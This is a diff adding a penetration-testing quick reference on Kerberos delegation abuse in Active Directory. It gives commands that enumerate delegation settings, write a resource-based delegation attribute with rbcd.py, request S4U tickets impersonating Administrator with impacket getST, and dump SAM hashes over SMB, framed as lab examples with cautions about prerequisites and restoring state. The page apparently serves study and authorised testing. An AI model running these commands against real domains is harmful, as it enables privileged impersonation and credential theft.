@@ -7,6 +7,129 @@ keywords: ["kerberos delegation", "unconstrained delegation", "constrained deleg
 
 {/* Generated from Active Directory/Reference/Kerberos Delegation Quick Reference.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Identify which delegation model is present
+
+Unconstrained delegation, classic constrained delegation and resource-based constrained delegation describe different trust relationships. Start with the account/computer attributes, the service principal names, and the object rights your identity actually holds.
+
+### Read the relevant attributes
+
+```powershell
+Get-ADComputer -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount
+Get-ADUser -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,ServicePrincipalName
+```
+
+Inspect a promising object directly to avoid losing attributes in a wide table:
+
+```powershell
+Get-ADComputer TARGET_HOST -Properties * | Select-Object Name,ServicePrincipalName,TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount | Format-List
+```
+
+The target resource's delegation configuration and the controlled account's configuration have different meanings. Preserve the actual distinguished names and SPNs.
+
+### Match the finding to its prerequisites
+
+| Model | Relationship to verify |
+| --- | --- |
+| Unconstrained | You control the relevant service/host and a usable delegated ticket becomes available in that context |
+| Classic constrained | The controlled service account can delegate to the specified SPN, with the required S4U/protocol-transition conditions |
+| Resource-based constrained | The resource's allowed-to-act configuration authorizes the controlled service principal, and the relevant object right/configuration is present |
+
+Sensitive-account settings, Protected Users, ticket encryption and current domain behavior can prevent a proposed path. Do not assume every privileged account can be impersonated.
+
+### Inspect tickets and request the exact service
+
+```bash
+klist
+impacket-getST 'DOMAIN_FQDN/SERVICE_ACCOUNT' -spn cifs/TARGET_FQDN -dc-ip DC_IP
+```
+
+That is an ordinary service-ticket request. An S4U request adds a separate impersonation step and is meaningful only after the delegation prerequisites are verified:
+
+```bash
+impacket-getST 'DOMAIN_FQDN/SERVICE_ACCOUNT' -spn cifs/TARGET_FQDN \
+  -impersonate LAB_TARGET_USER -dc-ip DC_IP
+```
+
+Read the tool's returned filename rather than assuming a fixed cache name. Inspect the cache and select it explicitly for the intended client:
+
+```bash
+export KRB5CCNAME='/absolute/path/RETURNED_CACHE.ccache'
+klist
+```
+
+### Verify the service result and preserve state
+
+Use a Kerberos-capable client against the matching target hostname and service. A ticket for one SPN is not a universal credential. If an RBCD lab modifies an attribute, record its original value and the exact principal added, verify the resulting state, and restore the intended baseline afterward. A failed request should send you back to identity, SPN, delegation settings, account protections, DNS and time—not immediately to a different guessed payload.
+
+## getST.py: choose the operation and read the result
+
+Request a Kerberos service ticket.
+
+### What the result establishes
+
+Inspect the requested SPN and returned service identity before using the cache with a client.
+
+### Prerequisites and common failures
+
+Ordinary service-ticket requests and S4U impersonation require different rights; delegation configuration and protected-account restrictions can prevent impersonation.
+
+### Example 1: Commands
+
+Run in: **Kali**. Requires the relevant delegation configuration/rights; credentials alone do not grant impersonation.
+
+```bash
+impacket-getST -spn cifs/TARGET_FQDN -impersonate USER_TO_IMPERSONATE -dc-ip DC_IP 'DOMAIN/SERVICE_ACCOUNT:PASSWORD'
+```
+
+### Example 2: Constrained (S4U)
+
+Run in: **Saved lab example**.
+
+```bash
+# You control an account with "allowed to delegate to" a service
+getST.py -spn cifs/target $DOMAIN/svc:PASS -impersonate Administrator -dc-ip $DC
+export KRB5CCNAME=Administrator.ccache
+nxc smb target -k --sam
+```
+
+Saved context: [Kerberos Delegation: Quick Reference — Constrained (S4U)](/active-directory/delegation#constrained-s4u). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Resource-Based (RBCD)
+
+Run in: **Saved lab example**.
+
+```bash
+# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
+rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
+getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
+```
+
+Saved context: [Kerberos Delegation: Quick Reference — Resource-Based (RBCD)](/active-directory/delegation#resource-based-rbcd). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## rbcd.py: choose the operation and read the result
+
+Commands and examples collected from your rbcd.py notes.
+
+### What the result establishes
+
+Read the target computer's allowed-to-act descriptor and resolve the principals it authorizes.
+
+### Prerequisites and common failures
+
+Writing the attribute requires an applicable object right, and the controlled principal must meet the delegation flow's prerequisites.
+
+### Example 1: Resource-Based (RBCD)
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```bash
+# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
+rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
+getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
+```
+
+## Existing notes and worked examples
+
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 Delegation lets a service act on behalf of a user. Misconfigured, it leads straight to impersonation of privileged accounts.
